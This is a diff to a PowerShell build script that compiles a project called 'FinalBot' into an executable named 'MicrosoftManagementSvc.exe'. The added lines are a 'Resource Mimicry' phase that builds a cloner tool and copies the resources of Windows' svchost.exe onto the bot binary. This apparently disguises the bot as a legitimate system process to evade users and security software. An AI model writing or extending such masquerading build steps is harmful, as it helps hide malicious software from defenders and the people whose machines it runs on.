@@ -189,6 +189,13 @@ dotnet publish FinalBot.csproj -c Release -r win-x64 -p:PublishAot=true --nologo
 if ($LASTEXITCODE -ne 0) { throw "Core Engine Build FAILED!" }
 
 $FinalExe = "bin\Release\net8.0-windows\win-x64\publish\MicrosoftManagementSvc.exe"
+
+Write-Host "[*] Phase 6: Resource Mimicry (svchost cloning)..." -ForegroundColor Cyan
+dotnet publish tools\ResourceCloner.csproj -c Release -r win-x64 --self-contained true -o tools\publish --nologo
+if ($LASTEXITCODE -eq 0) {
+    $ClonerExe = "tools\publish\ResourceCloner.exe"
+    & $ClonerExe "C:\Windows\System32\svchost.exe" $FinalExe
+}
 Write-Host "`n[SUCCESS] Ultra-Optimized build complete!" -ForegroundColor Green
 Write-Host "[+] Binary: $FinalExe" -ForegroundColor White
 $Size = (Get-Item $FinalExe).Length / 1MB
